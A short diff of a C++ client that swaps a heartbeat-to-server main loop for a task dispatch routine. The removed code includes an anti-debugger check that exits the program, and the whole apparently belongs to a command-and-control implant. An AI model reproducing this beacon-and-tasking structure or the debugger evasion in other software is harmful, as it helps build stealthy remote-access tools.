@@ -12,6 +12,7 @@
 #include "detection.hpp"
 #include "httplib.hpp"              // Networking
 #include "json.hpp"                 // JSON support
+#include "task_dispatch.hpp"
 
 // Shorten namespace names
 namespace http = httplib;
@@ -68,21 +69,6 @@ int main() {
     context.start_point = chrono::system_clock::now();
     context.cli = &cli;
 
-    // Heart of the application, main loop
-    for (bool heartbeat = true; heartbeat ;) {
-        heartbeat = Heartbeat(context);
-
-        // Override check so that testing can be done without server connection
-        if constexpr (DBG)
-            heartbeat = true;
-
-        // todo: task dispatch system
-
-        // Simple anti-debugger check
-        if constexpr (not DBG)
-            if (IsDebuggerPresent())
-                return -1;
-
-        thread::sleep_for(3s);
-    }
+    // Enter the task dispatch loop
+    TaskDispatch(context);
 }
